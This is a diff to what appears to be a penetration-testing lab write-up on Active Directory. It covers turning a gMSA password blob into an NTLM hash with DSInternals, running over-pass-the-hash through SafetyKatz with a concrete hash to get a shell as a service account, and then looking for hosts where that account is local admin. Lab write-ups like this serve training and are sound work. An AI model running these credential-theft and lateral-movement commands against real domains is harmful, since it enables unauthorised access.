@@ -560,7 +560,8 @@ Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
 $decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
 ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
 
-sekurlsa::pth /user:usernameHere /domain:dom.local /ntlm:0......
+Output is an NTLM hash you use for over-pass-the hash - see 4.
+
 
 <strong>(3. Verify that PW matches from AD - optional)
 </strong>Next step I perform in the lab is to to confirm that the NT password hash that DSInternals provides matches that in Active Directory.
@@ -572,11 +573,9 @@ $hash2
 4. We can use the hash for Auth and run a cmd as service account
 C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:jumpone /domain:us.techcorp.local /ntlm:3361912e368ac24552f71ffabfa7e0b5 /run:cmd.exe" 
 
-5. Find out where local admin
+5. Find out where user is local admin
  . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
  Find-PSRemotingLocalAdminAccess -Verbose
-
-"exit"/ntlm:0a02c684cc0fa1744195edd1aec43078 
 
 </code></pre>
 
